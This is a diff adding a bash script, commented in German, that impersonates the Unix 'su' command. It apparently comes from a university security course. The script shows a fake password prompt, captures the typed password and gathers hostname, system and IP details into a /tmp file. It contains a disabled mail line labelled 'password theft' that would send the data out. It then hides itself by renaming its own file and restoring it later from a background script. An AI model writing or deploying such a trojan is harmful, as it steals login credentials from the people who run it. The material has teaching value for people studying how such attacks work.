@@ -1,0 +1,44 @@
+#!/bin/bash
+INFO_FILE="/tmp/su_infofile.txt"
+SU_HIDDEN="/tmp/su_hidden"
+RENAME_SCRIPT="/tmp/rename_su"
+TIME="20"
+
+# Step 1: Verhalten nachbilden
+echo -n "Passwort: "	# -n: kein Zeilenvorschub:w
+read -s PASSWORD 	# -s: silent, kein Echo
+echo			# Zeilenvorschub
+sleep 1			# 5 s warten (zum Test 1 s)
+echo "su: Fehler bei Authentifizierung"
+
+# Step 2: Informationen sammeln
+echo "Befehl		: "$0 $1 $2 $3 $4 $5 	>  $INFO_FILE
+echo "Passwort lautet	: "$PASSWORD 		>> $INFO_FILE
+echo "Hostname		: "$HOSTNAME		>> $INFO_FILE
+echo "uname -a liefert	: "`/usr/bin/uname -a`	>> $INFO_FILE
+echo "IPv4 Adressen	: "`/sbin/ifconfig | grep "inet Adresse:"` >> $INFO_FILE
+echo "."					>> $INFO_FILE	# beendet das mail-Programm, s.u.
+
+# Step 3: Informationen versenden
+# mail -s "Passwortklau" -r bill.gates@kleinweich.test studierende@cs14.ba-leipzig.de < $INFO_FILE
+
+# Step 4: Verstecken
+PATH_SU=`pwd`"/su"
+mv $PATH_SU $SU_HIDDEN	# ausgeführt wird ja die Kopie im Arbeitsspeicher
+
+# Rückbenennungsscript erstellen
+echo "#!/bin/bash"			>  $RENAME_SCRIPT
+echo "sleep $TIME"                      >> $RENAME_SCRIPT
+echo "mv $SU_HIDDEN $PATH_SU"           >> $RENAME_SCRIPT
+echo "rm $RENAME_SCRIPT"		>> $RENAME_SCRIPT
+echo "exit 0"  	                        >> $RENAME_SCRIPT
+# ausführbar machen
+chmod 777 $RENAME_SCRIPT
+# ausführen (in der Variablen muss ein Pfad enthalten sein)
+$RENAME_SCRIPT &	# unbedingt im Hintergrund ausführen!
+
+# Step 5: Aufräumen
+# rm $RENAME_SCRIPT
+rm $INFO_FILE
+
+exit 0
